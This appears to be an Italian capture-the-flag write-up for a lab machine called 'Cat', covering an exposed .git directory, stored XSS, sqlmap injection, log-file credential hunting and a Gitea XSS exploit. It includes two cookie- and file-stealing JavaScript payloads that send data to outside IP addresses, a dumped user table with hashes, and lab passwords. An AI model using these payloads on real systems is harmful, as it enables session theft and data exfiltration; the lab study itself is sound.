@@ -1,0 +1,57 @@
+si può trovare dei file .git sul sito. allora con tool come gitdumper si ottiene tutto il sorgente.
+
+si nota alcune sqli in pagine accessibili solo all'admin, come in accept_cat.
+allora cerco un modo per rubare il cookie o le credenziali, e trovo che lo username non viene sanificato e anzi che viene visualizzato cosi nella pagina admin nella quale si approvano i gatti:
+<strong>Owner:</strong> <?php echo $cat['username']; ?><br>
+
+quindi è possibile fare XSS stored tramite la registrazione di un utente.
+si ottiene il cookie admin: 5vocjt0kctslc914snkr4t86sl
+
+e si tenta la sqli nella accept_cat.php (USA VPN TCP PER SQLMAP)
+Table: users
+[13 entries]
++---------+-------------------------------+----------------------------------+--------------------------------------------------------------------------------------+
+| user_id | email                         | password                         | username                                                                             |
++---------+-------------------------------+----------------------------------+--------------------------------------------------------------------------------------+
+| 1       | axel2017@gmail.com            | d1bbba3670feb9435c9841e46e60ee2f | axel                                                                                 |
+| 2       | rosamendoza485@gmail.com      | ac369922d560f17d6eeb8b2c7dec498c | rosa                                                                                 |
+| 3       | robertcervantes2000@gmail.com | 42846631708f69c00ec0c0a8aa4a92ad | robert                                                                               |
+| 4       | fabiancarachure2323@gmail.com | 39e153e825c4a3d314a0dc7f7475ddbe | fabian                                                                               |
+| 5       | jerrysonC343@gmail.com        | 781593e060f8d065cd7281c5ec5b4b86 | jerryson                                                                             |
+| 6       | larryP5656@gmail.com          | 1b6dce240bbfbc0905a664ad199e18f8 | larry                                                                                |
+| 7       | royer.royer2323@gmail.com     | c598f6b844a36fa7836fba0835f1f6   | royer                                                                                |
+| 8       | peterCC456@gmail.com          | e41ccefa439fc454f7eadbf1f139ed8a | peter                                                                                |
+| 9       | angel234g@gmail.com           | 24a8ec003ac2e1b3c5953a6f95f8f565 | angel                                                                                |
+| 10      | jobert2020@gmail.com          | 88e4dceccd48820cf77b5cf6c08698ad | jobert                                                                               |
+| 11      | kkl@mail.com                  | 8dd4ad608f980585c523f3111cb7c4e8 | kkl<script>fetch("http://10.10.14.31:8000/cookie?data=" + document.cookie);</script> |
+| <blank> | <blank>                       | <blank>                          | <blank>                                                                              |
+| <blank> | <blank>                       | <blank>                          | <blank>                                                                              |
++---------+-------------------------------+----------------------------------+--------------------------------------------------------------------------------------+
+the only easily crackable hash is the one of rosa that is:
+
+soyunaprincesarosa
+
+che provo su ssh e funziona. ma ancora serve fare lateral movement
+
+paths:
+/etc/apache2/sites-enabled/cat.htb.conf
+in /var/log/apache2/access.log.1 si trova
+axel password: aNdZwgC4tI9gnVXv_e3Q
+
+
+ROOT:
+files with linpeas -a:
+/var/spool/mail/axel
+/var/spool/mail/jobert
+
+nella mail viene citato un servizio Gitea sulla porta 3000, e rosa dice che dobbiamo inserire una description sensata perchè lei la controllerà
+cercando online si trova una XSS stored per quella version di Gitea la cui POC sfrutta proprio la Gitea repo description
+
+una volta creata la poc, ed inviata una mail a jobert come indicato da rosa, si viene contattati ma non funziona il semplice furto di cookie. quindi sempre seguendo la poc tento un payload javascript più complesso, che visiti file e mandi la risposta a me cosi da visualizzarne il contenuto:
+<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md").then(response=>response.text()).then(data=>fetch("http://10.10.14.29:9090/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>XSS test</a>
+
+leggendo vari file, tra cui index.php si trova:
+
+<?php
+$valid_username = 'admin';
+$valid_password = 'IKw75eR0MR7CMIxhH0';
